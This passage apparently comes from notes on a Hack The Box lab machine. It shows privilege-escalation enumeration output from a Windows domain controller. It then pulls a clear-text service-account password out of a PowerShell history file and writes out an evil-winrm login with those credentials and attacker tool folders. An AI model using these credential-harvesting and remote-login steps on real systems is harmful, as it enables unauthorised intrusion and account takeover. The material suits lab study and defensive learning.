ismserv                               2416              0
LogonUI                               4708              1
lsass                                  628              0
Microsoft.ActiveDirectory.WebServices 2992              0
vds                                   3528              0
VGAuthService                         2860              0
vm3dservice                           2572              1
vm3dservice                           2676              0
vm3dservice                           3312              1
vmtoolsd                              2144              0
wininit                                472              0
winlogon                               540              1
WmiPrvSE                              2756              0



+------+------------------------------------------------+------+
| TEST | SCHEDULED TASKS > Binary Permissions           | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the scheduled tasks that are not owned by   |
|      | the current user and checks whether the target binary |
|      | can be modified. Note that, as a low-privileged user, |
|      | it's not possible to enumerate all the scheduled      |
|      | tasks.                                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CREDS > SAM/SYSTEM/SECURITY Files              | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the SAM/SYSTEM/SECURITY files are       |
|      | configured with weak permissions, allowing a          |
|      | low-privileged user to read them - HiveNightmare      |
|      | (CVE-2021-36934).                                     |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CREDS > SAM/SYSTEM/SECURITY in shadow copies   | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the SAM/SYSTEM/SECURITY files in shadow |
|      | copies are configured with weak permissions, allowing |
|      | a low-privileged user to read them. Can happen when   |
|      | HiveNightmare (CVE-2021-36934) mitigations have not   |
|      | been applied manually.                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CREDS > Unattend Files                         | VULN |
+------+------------------------------------------------+------+
| DESC | Locate 'Unattend' files and check whether they        |
|      | contain any clear-text credentials.                   |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CREDS > WinLogon                               | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the Winlogon registry keys and check whether    |
|      | they contain any clear-text password. Entries that    |
|      | have an empty password field are filtered out.        |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CREDS > Credential Files                       | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the credential files that are present in    |
|      | the current user's HOME folder. This is purely        |
|      | informative.                                          |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | CREDS > Vault Creds                            | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the credentials that are saved in the       |
|      | current user's vault.                                 |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | CREDS > Vault List                             | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the web credentials that are saved in the   |
|      | current user's Vault.                                 |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | CREDS > GPP Passwords                          | VULN |
+------+------------------------------------------------+------+
| DESC | Locate old cached Group Policy Preference files that  |
|      | contain a 'cpassword' field and extract the           |
|      | clear-text credentials.                               |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CREDS > PowerShell History                     | INFO |
+------+------------------------------------------------+------+
| DESC | Locate the current user's PowerShell history file and |
|      | check whether it contains some clear-text             |
|      | credentials. This check is simply based on keyword    |
|      | matching and might not be entirely reliable.          |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Path          : C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
CreationTime  : 3/3/2022 11:46:47 PM
LastWriteTime : 3/3/2022 11:46:47 PM
Lines         : 10
Matches       : 2




+------+------------------------------------------------+------+
| TEST | HARDENING > UAC Settings                       | INFO |
+------+------------------------------------------------+------+
| DESC | Retrieve the User Access Control (UAC) configuration  |
|      | and check whether it is enabled.                      |
+------+-------------------------------------------------------+
[*] Found 3 result(s).


Key         : HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
Value       : EnableLUA
Data        : 1
Description : UAC is enabled (default)
Compliance  : True

Key         : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
Value       : LocalAccountTokenFilterPolicy
Data        : (null)
Description : Only the built-in Administrator account (RID 500) can be granted a high integrity token when authenticating remotely (default)
Compliance  : True

Key         : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
Value       : FilterAdministratorToken
Data        : (null)
Description : The built-in administrator account (RID 500) is granted a high integrity token when authenticating remotely (default).
Compliance  : False




+------+------------------------------------------------+------+
| TEST | HARDENING > LSA Protection (RunAsPPL)          | INFO |
+------+------------------------------------------------+------+
| DESC | Checks the status of LSA protection (a.k.a.           |
|      | RunAsPPL).                                            |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Key         : HKLM\SYSTEM\CurrentControlSet\Control\Lsa
Value       : RunAsPPL
Data        : (null)
Description : RunAsPPL is not enabled
Compliance  : False




+------+------------------------------------------------+------+
| TEST | HARDENING > Credential Guard                   | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether Credential Guard is supported and      |
|      | enabled.                                              |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Name                                  : Credential Guard
DeviceGuardSecurityServicesConfigured : (null)
DeviceGuardSecurityServicesRunning    : (null)
Description                           : Credential Guard is not configured
Compliance                            : False




+------+------------------------------------------------+------+
| TEST | HARDENING > UEFI & Secure Boot                 | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether UEFI and Secure are supported and      |
|      | enabled.                                              |
+------+-------------------------------------------------------+
[*] Found 2 result(s).

Name        Status Description
----        ------ -----------
UEFI          True BIOS mode is UEFI
Secure Boot   True Secure Boot is enabled



+------+------------------------------------------------+------+
| TEST | HARDENING > LAPS                               | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether LAPS is enabled.                       |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Key         : HKLM\SOFTWARE\Policies\Microsoft Services\AdmPwd
Value       : AdmPwdEnabled
Data        : 1
Description : LAPS is enabled
Compliance  : True




+------+------------------------------------------------+------+
| TEST | HARDENING > PowerShell Transcription           | INFO |
+------+------------------------------------------------+------+
| DESC | Check whether PowerShell Transcription is configured  |
|      | and enabled. If so, the path of the output log file   |
|      | will be returned.                                     |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | HARDENING > BitLocker                          | INFO |
+------+------------------------------------------------+------+
| DESC | Check whether BitLocker is configured and enabled on  |
|      | the system drive. Note that this check will yield a   |
|      | false positive if another encryption software is in   |
|      | use.                                                  |
+------+-------------------------------------------------------+
+------+------------------------------------------------+------+
| TEST | CONFIG > PATH Folder Permissions               | VULN |
+------+------------------------------------------------+------+
| DESC | Retrieve the list of SYSTEM %PATH% folders and check  |
|      | whether the current user has some write permissions   |
|      | in any of them.                                       |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | MISC > Hijackable DLLs                         | INFO |
+------+------------------------------------------------+------+
| DESC | List Windows services that are prone to Ghost DLL     |
|      | hijacking. This is particularly relevant if the       |
|      | current user can create files in one of the SYSTEM    |
|      | %PATH% folders.                                       |
+------+-------------------------------------------------------+
[*] Found 3 result(s).


Name           : cdpsgshims.dll
Description    : Loaded by CDPSvc upon service startup
RunAs          : NT AUTHORITY\LocalService
RebootRequired : True

Name           : WptsExtensions.dll
Description    : Loaded by the Task Scheduler upon service startup
RunAs          : LocalSystem
RebootRequired : True

Name           : wlanapi.dll
Description    : Loaded by NetMan when listing network interfaces
RunAs          : LocalSystem
RebootRequired : False




+------+------------------------------------------------+------+
| TEST | CONFIG > AlwaysInstallElevated                 | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the 'AlwaysInstallElevated' registry    |
|      | keys are configured and enabled. If so any user might |
|      | be able to run arbitary MSI files with SYSTEM         |
|      | privileges.                                           |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CONFIG > WSUS Configuration                    | VULN |
+------+------------------------------------------------+------+
| DESC | If WSUS is configured and enabled, check whether the  |
|      | service uses an insecure URL (http://*). If so, it    |
|      | might be vulnerable to MitM attacks. Note that in     |
|      | case of local exploitation, the value of              |
|      | 'SetProxyBehaviorForUpdateDetection' determines       |
|      | whether the service uses the system or user proxy     |
|      | settings.                                             |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CONFIG > Hardened UNC Paths                    | VULN |
+------+------------------------------------------------+------+
| DESC | Check hardened UNC paths. If not properly configured, |
|      | a Man-in-the-Middle might be able to run arbitrary    |
|      | code with SYSTEM privileges by injecting malicious    |
|      | group policies during a group policy update (SYSVOL   |
|      | only).                                                |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CONFIG > SCCM Cache Folder (info)              | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether the SCCM cache folder exists. Manual   |
|      | investigation might be required during                |
|      | post-exploitation.                                    |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | CONFIG > SCCM Cache Folder                     | VULN |
+------+------------------------------------------------+------+
| DESC | Checks whether the current user can browse the SCCM   |
|      | cache folder. If so, hardcoded credentials might be   |
|      | extracted from MSI package files or scripts.          |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CONFIG > Point and Print                       | VULN |
+------+------------------------------------------------+------+
| DESC | Checks whether the Print Spooler service is enabled   |
|      | and if the Point and Print configuration allows       |
|      | low-privileged users to install printer drivers.      |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | CONFIG > Driver Co-Installers                  | INFO |
+------+------------------------------------------------+------+
| DESC | Check whether the 'DisableCoInstallers' registry key  |
|      | is absent or disabled. If so any user might be able   |
|      | to run arbitrary code with SYSTEM privileges by       |
|      | plugging a device automatically installing vulnerable |
|      | software along with its driver.                       |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Key         : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Installer
Value       : DisableCoInstallers
Data        : (null)
Description : CoInstallers are enabled (default)
Compliance  : False




+------+------------------------------------------------+------+
| TEST | NETWORK > Interfaces                           | INFO |
+------+------------------------------------------------+------+
| DESC | Collect detailed information about all active         |
|      | Ethernet adapters.                                    |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Name            : {E26B1AE0-F9C1-45CB-A6E6-B4B8E2222CC6}
FriendlyName    : Ethernet0
Type            : Ethernet
Status          : Up
DnsSuffix       : .htb
Description     : vmxnet3 Ethernet Adapter
PhysicalAddress : 00:50:56:b9:f0:1a
Flags           : DdnsEnabled, Dhcpv4Enabled, NetbiosOverTcpipEnabled, Ipv4Enabled, Ipv6Enabled
IPv6            : dead:beef::51 (/128), dead:beef::2483:bced:d1c1:21cf (/64), fe80::2483:bced:d1c1:21cf (/64)
IPv4            : 10.129.154.12 (/16)
Gateway         : fe80::250:56ff:feb9:44e3, 10.129.0.1
DHCPv4Server    : 10.129.0.1
DHCPv6Server    :
DnsServers      : 127.0.0.1
DNSSuffixList   : htb




+------+------------------------------------------------+------+
| TEST | NETWORK > TCP Endpoints                        | INFO |
+------+------------------------------------------------+------+
| DESC | List all TCP ports that are in a LISTEN state. For    |
|      | each one, the corresponding process is also returned. |
+------+-------------------------------------------------------+
[*] Found 49 result(s).

IP   Proto LocalAddress                        State      PID Name
--   ----- ------------                        -----      --- ----
IPv4 TCP   0.0.0.0:88                          LISTENING  628 lsass
IPv4 TCP   0.0.0.0:135                         LISTENING  888 svchost
IPv4 TCP   0.0.0.0:389                         LISTENING  628 lsass
IPv4 TCP   0.0.0.0:445                         LISTENING    4 System
IPv4 TCP   0.0.0.0:464                         LISTENING  628 lsass
IPv4 TCP   0.0.0.0:593                         LISTENING  888 svchost
IPv4 TCP   0.0.0.0:636                         LISTENING  628 lsass
IPv4 TCP   0.0.0.0:3268                        LISTENING  628 lsass
IPv4 TCP   0.0.0.0:3269                        LISTENING  628 lsass
IPv4 TCP   0.0.0.0:5986                        LISTENING    4 System
IPv4 TCP   0.0.0.0:9389                        LISTENING 2992 Microsoft.ActiveDirectory.WebServices
IPv4 TCP   0.0.0.0:47001                       LISTENING    4 System
IPv4 TCP   0.0.0.0:49664                       LISTENING  472 wininit
IPv4 TCP   0.0.0.0:49665                       LISTENING 1084 svchost
IPv4 TCP   0.0.0.0:49666                       LISTENING 1484 svchost
IPv4 TCP   0.0.0.0:49667                       LISTENING  628 lsass
IPv4 TCP   0.0.0.0:49673                       LISTENING  628 lsass
IPv4 TCP   0.0.0.0:49674                       LISTENING  628 lsass
IPv4 TCP   0.0.0.0:49684                       LISTENING  608 services
IPv4 TCP   0.0.0.0:49696                       LISTENING 3048 dns
IPv4 TCP   0.0.0.0:64007                       LISTENING 3000 dfsrs
IPv4 TCP   10.129.154.12:53                    LISTENING 3048 dns
IPv4 TCP   10.129.154.12:139                   LISTENING    4 System
IPv4 TCP   127.0.0.1:53                        LISTENING 3048 dns
IPv6 TCP   [::]:88                             LISTENING  628 lsass
IPv6 TCP   [::]:135                            LISTENING  888 svchost
IPv6 TCP   [::]:389                            LISTENING  628 lsass
IPv6 TCP   [::]:445                            LISTENING    4 System
IPv6 TCP   [::]:464                            LISTENING  628 lsass
IPv6 TCP   [::]:593                            LISTENING  888 svchost
IPv6 TCP   [::]:636                            LISTENING  628 lsass
IPv6 TCP   [::]:3268                           LISTENING  628 lsass
IPv6 TCP   [::]:3269                           LISTENING  628 lsass
IPv6 TCP   [::]:5986                           LISTENING    4 System
IPv6 TCP   [::]:9389                           LISTENING 2992 Microsoft.ActiveDirectory.WebServices
IPv6 TCP   [::]:47001                          LISTENING    4 System
IPv6 TCP   [::]:49664                          LISTENING  472 wininit
IPv6 TCP   [::]:49665                          LISTENING 1084 svchost
IPv6 TCP   [::]:49666                          LISTENING 1484 svchost
IPv6 TCP   [::]:49667                          LISTENING  628 lsass
IPv6 TCP   [::]:49673                          LISTENING  628 lsass
IPv6 TCP   [::]:49674                          LISTENING  628 lsass
IPv6 TCP   [::]:49684                          LISTENING  608 services
IPv6 TCP   [::]:49696                          LISTENING 3048 dns
IPv6 TCP   [::]:64007                          LISTENING 3000 dfsrs
IPv6 TCP   [::1]:53                            LISTENING 3048 dns
IPv6 TCP   [dead:beef::51]:53                  LISTENING 3048 dns
IPv6 TCP   [dead:beef::2483:bced:d1c1:21cf]:53 LISTENING 3048 dns
IPv6 TCP   [fe80::2483:bced:d1c1:21cf%13]:53   LISTENING 3048 dns



+------+------------------------------------------------+------+
| TEST | NETWORK > UDP Endpoints                        | INFO |
+------+------------------------------------------------+------+
| DESC | List all UDP ports that are in a LISTEN state. For    |
|      | each one, the corresponding process is also returned. |
|      | DNS is filtered out to minimize the output.           |
+------+-------------------------------------------------------+
[*] Found 32 result(s).

IP   Proto LocalAddress                         State  PID Name
--   ----- ------------                         -----  --- ----
IPv4 UDP   0.0.0.0:123                          N/A    340 svchost
IPv4 UDP   0.0.0.0:389                          N/A    628 lsass
IPv4 UDP   0.0.0.0:500                          N/A   2108 svchost
IPv4 UDP   0.0.0.0:4500                         N/A   2108 svchost
IPv4 UDP   0.0.0.0:5353                         N/A   1148 svchost
IPv4 UDP   0.0.0.0:5355                         N/A   1148 svchost
IPv4 UDP   0.0.0.0:59583                        N/A   1148 svchost
IPv4 UDP   10.129.154.12:88                     N/A    628 lsass
IPv4 UDP   10.129.154.12:137                    N/A      4 System
IPv4 UDP   10.129.154.12:138                    N/A      4 System
IPv4 UDP   10.129.154.12:464                    N/A    628 lsass
IPv4 UDP   127.0.0.1:49197                      N/A   1588 svchost
IPv4 UDP   127.0.0.1:49500                      N/A   2412 dfssvc
IPv4 UDP   127.0.0.1:51608                      N/A   3000 dfsrs
IPv4 UDP   127.0.0.1:52212                      N/A   1280 svchost
IPv4 UDP   127.0.0.1:52413                      N/A   2416 ismserv
IPv4 UDP   127.0.0.1:59163                      N/A    628 lsass
IPv4 UDP   127.0.0.1:59178                      N/A   1240 svchost
IPv4 UDP   127.0.0.1:64588                      N/A   2992 Microsoft.ActiveDirectory.WebServices
IPv6 UDP   [::]:123                             N/A    340 svchost
IPv6 UDP   [::]:389                             N/A    628 lsass
IPv6 UDP   [::]:500                             N/A   2108 svchost
IPv6 UDP   [::]:4500                            N/A   2108 svchost
IPv6 UDP   [::]:5353                            N/A   1148 svchost
IPv6 UDP   [::]:5355                            N/A   1148 svchost
IPv6 UDP   [::]:57456                           N/A   1148 svchost
IPv6 UDP   [dead:beef::51]:88                   N/A    628 lsass
IPv6 UDP   [dead:beef::51]:464                  N/A    628 lsass
IPv6 UDP   [dead:beef::2483:bced:d1c1:21cf]:88  N/A    628 lsass
IPv6 UDP   [dead:beef::2483:bced:d1c1:21cf]:464 N/A    628 lsass
IPv6 UDP   [fe80::2483:bced:d1c1:21cf%13]:88    N/A    628 lsass
IPv6 UDP   [fe80::2483:bced:d1c1:21cf%13]:464   N/A    628 lsass



+------+------------------------------------------------+------+
| TEST | NETWORK > Saved Wi-Fi Profiles                 | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate saved Wifi profiles. For WEP/WPA-PSK        |
|      | profiles, the clear-text passphrase is extracted      |
|      | (when possible). For 802.1x profiles, a series of     |
|      | tests is performed to highlight potential             |
|      | misconfiguration.                                     |
+------+-------------------------------------------------------+
Warning: Exception calling "WlanOpenHandle" with "4" argument(s): "Unable to load DLL 'wlanapi': The specified module could not be found. (Exception from HRESULT: 0x8007007E)"
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | NETWORK > Wi-Fi Airstrike Attack               | INFO |
+------+------------------------------------------------+------+
| DESC | Checks whether the 'Do not display network selection  |
|      | UI' policy is enforced on workstations.               |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows\System
Value       : DontDisplayNetworkSelectionUI
Data        : (null)
Description : The current machine is not a workstation.
Compliance  : True




+------+------------------------------------------------+------+
| TEST | UPDATES > Last Windows Update Date             | INFO |
+------+------------------------------------------------+------+
| DESC | Interact with the Windows Update service and          |
|      | determine when the system was last updated. Note that |
|      | this check might be unreliable.                       |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | UPDATES > System up to date? (info)            | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the installed updates and hotfixes by       |
|      | parsing the registry. If this fails, the check will   |
|      | fall back to the built-in 'Get-HotFix' cmdlet.        |
+------+-------------------------------------------------------+
[*] Found 12 result(s).

HotFixID  Description     InstalledBy                                  InstalledOn
--------  -----------     -----------                                  -----------
KB5011503 Security Update NT AUTHORITY\SYSTEM                          3/21/2022 8:46:33 PM
KB4502496 Security Update NT AUTHORITY\SYSTEM                          3/3/2022 10:45:13 PM
KB4535685 Security Update NT AUTHORITY\SYSTEM                          3/3/2022 10:45:12 PM
KB4535684 Security Update NT AUTHORITY\SYSTEM                          3/3/2022 10:45:11 PM
KB4589208 Update          NT AUTHORITY\SYSTEM                          3/3/2022 10:44:58 PM
KB5010427 Update          NT AUTHORITY\SYSTEM                          3/3/2022 10:44:58 PM
KB5010351                 NT AUTHORITY\SYSTEM                          3/3/2022 10:06:18 PM
KB5009642 Update          NT AUTHORITY\SYSTEM                          3/3/2022 9:12:32 PM
KB4512578 Security Update S-1-5-21-89493159-3068390195-4120627384-1047 9/6/2019 5:31:09 PM
KB4512577 Security Update S-1-5-21-89493159-3068390195-4120627384-1047 9/6/2019 5:24:38 PM
KB5009472 Update                                                       12/31/1600 4:00:00 PM
KB4514366 Update                                                       12/31/1600 4:00:00 PM



+------+------------------------------------------------+------+
| TEST | UPDATES > System up to date?                   | VULN |
+------+------------------------------------------------+------+
| DESC | Enumerate the installed updates and hotfixes and      |
|      | check whether a patch was applied in the last 31      |
|      | days.                                                 |
+------+-------------------------------------------------------+
[!] Not vulnerable.

+------+------------------------------------------------+------+
| TEST | MISC > Endpoint Protection                     | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate installed security products (AV, EDR). This |
|      | check is based on keyword matching (loaded DLLs,      |
|      | running processes, installed applications and         |
|      | registered services).                                 |
+------+-------------------------------------------------------+
[*] Found 18 result(s).

ProductName      Source                Pattern
-----------      ------                -------
AMSI             Loaded DLL            OriginalFilename=amsi.dll
AMSI             Loaded DLL            InternalName=amsi.dll
AMSI             Loaded DLL            FileName=C:\Windows\system32\amsi.dll
Windows Defender Installed application Name=Windows Defender Advanced Threat Protection
Windows Defender Installed application Name=Windows Defender
Windows Defender Installed application Name=Windows Defender
Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-320
Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-370
Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-330
Windows Defender Service               ImagePath="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2202.4-0\MsMpEng.exe"
Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-310
Windows Defender Service               ImagePath="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2202.4-0\NisSrv.exe"
Windows Defender Service               RegistryPath=HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService
Windows Defender Service               ImagePath=C:\Windows\system32\SecurityHealthService.exe
Windows Defender Service               Name=SecurityHealthService
Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender\MpAsDesc.dll,-390
Windows Defender Service               ImagePath="C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe,-1001



+------+------------------------------------------------+------+
| TEST | MISC > Defender exclusions                     | INFO |
+------+------------------------------------------------+------+
| DESC | List Microsoft Defender exclusions that were          |
|      | configured both locally and through GPO.              |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | MISC > OS Version                              | INFO |
+------+------------------------------------------------+------+
| DESC | Print the detailed version number of the Operating    |
|      | System. If we can't get the update history, this      |
|      | might be useful.                                      |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

Name                         Version
----                         -------
Windows Server 2019 Standard 10.0.17763 Version 1809 (17763.2686)



+------+------------------------------------------------+------+
| TEST | MISC > Local Admin Group                       | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the users and groups that belong to the     |
|      | local 'Administrators' group.                         |
+------+-------------------------------------------------------+
[*] Found 3 result(s).

Name              Type  IsLocal IsEnabled
----              ----  ------- ---------
Administrator     User     True      True
Enterprise Admins Group       0      True
Domain Admins     Group       0      True



+------+------------------------------------------------+------+
| TEST | MISC > User session list                       | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate the sessions of the currently logged-on     |
|      | users. It might be possible to capture or relay the   |
|      | NTLM/Kerberos authentication of these users           |
|      | (RemotePotato0, KrbRelay).                            |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | MISC > User Home Folders                       | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate local HOME folders and check for            |
|      | potentially weak permissions.                         |
+------+-------------------------------------------------------+
[*] Found 5 result(s).

HomeFolderPath          Read  Name
--------------          ----  ----
C:\Users\Administrator False False
C:\Users\legacyy        True  True
C:\Users\Public        False False
C:\Users\svc_deploy    False False
C:\Users\TRX           False False



+------+------------------------------------------------+------+
| TEST | MISC > Machine Role                            | INFO |
+------+------------------------------------------------+------+
| DESC | Simply return the machine's role. It can be either    |
|      | 'Workstation', 'Server' or 'Domain Controller'.       |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

Name     Role
----     ----
LanmanNT Domain Controller



+------+------------------------------------------------+------+
| TEST | MISC > System Startup History                  | INFO |
+------+------------------------------------------------+------+
| DESC | Retrieve the machine's startup history. This might be |
|      | useful to figure out how often a server is rebooted.  |
|      | In the case of a workstation, such metric isn't as    |
|      | relevant.                                             |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | MISC > Last System Startup                     | INFO |
+------+------------------------------------------------+------+
| DESC | Determine the last system startup date and time based |
|      | on the current tick count. Note that this might be    |
|      | unreliable.                                           |
+------+-------------------------------------------------------+
[!] Nothing found.

+------+------------------------------------------------+------+
| TEST | MISC > Filesystem Drives                       | INFO |
+------+------------------------------------------------+------+
| DESC | List partitions, removable storage and mapped network |
|      | shares.                                               |
+------+-------------------------------------------------------+
[*] Found 1 result(s).

Root DisplayRoot Description
---- ----------- -----------
C:\
```

Found this creds

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
```
evil-winrm -i 10.129.154.12 -P 8596 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -s '/home/bop/Workspace/hackthebox/timelapse/ps1_scripts/' -e '/home/bop/Workspace/hackthebox/timelapse/exe_files/' -S
```

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Documents> .\escalate.ps1

  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2992
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       472
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1084
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1484
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       608
  TCP    0.0.0.0:49696          0.0.0.0:0              LISTENING       3048
  TCP    0.0.0.0:64007          0.0.0.0:0              LISTENING       3000
  TCP    10.129.154.12:53       0.0.0.0:0              LISTENING       3048
  TCP    10.129.154.12:139      0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       3048
  TCP    [::]:88                [::]:0                 LISTENING       628
  TCP    [::]:135               [::]:0                 LISTENING       888
  TCP    [::]:389               [::]:0                 LISTENING       628
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       628
  TCP    [::]:593               [::]:0                 LISTENING       888
  TCP    [::]:636               [::]:0                 LISTENING       628
  TCP    [::]:3268              [::]:0                 LISTENING       628
  TCP    [::]:3269              [::]:0                 LISTENING       628
  TCP    [::]:5986              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       2992
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       472
  TCP    [::]:49665             [::]:0                 LISTENING       1084
  TCP    [::]:49666             [::]:0                 LISTENING       1484
  TCP    [::]:49667             [::]:0                 LISTENING       628
  TCP    [::]:49673             [::]:0                 LISTENING       628
  TCP    [::]:49674             [::]:0                 LISTENING       628
  TCP    [::]:49684             [::]:0                 LISTENING       608
  TCP    [::]:49696             [::]:0                 LISTENING       3048
  TCP    [::]:64007             [::]:0                 LISTENING       3000
  TCP    [::1]:53               [::]:0                 LISTENING       3048
  TCP    [dead:beef::51]:53     [::]:0                 LISTENING       3048
  TCP    [dead:beef::2483:bced:d1c1:21cf]:53  [::]:0                 LISTENING       3048
  TCP    [fe80::2483:bced:d1c1:21cf%13]:53  [::]:0                 LISTENING       3048
The value of the FilePath parameter must be a Windows PowerShell script file. Enter the path to a file with a .ps1 file name extension and try the command again.
Parameter name: filePath
At C:\Users\legacyy\Documents\escalate.ps1:5 char:1
+ invoke-command -computername localhost -credential $c -port 5986 -use ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Invoke-Command], ArgumentException
    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.InvokeCommandCommand
The term 'SessionOption' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At C:\Users\legacyy\Documents\escalate.ps1:6 char:1
+ SessionOption $so -scriptblock {whoami}
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (SessionOption:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

AccountExpirationDate                :
accountExpires                       : 9223372036854775807
AccountLockoutTime                   :
AccountNotDelegated                  : False
adminCount                           : 1
AllowReversiblePasswordEncryption    : False
AuthenticationPolicy                 : {}
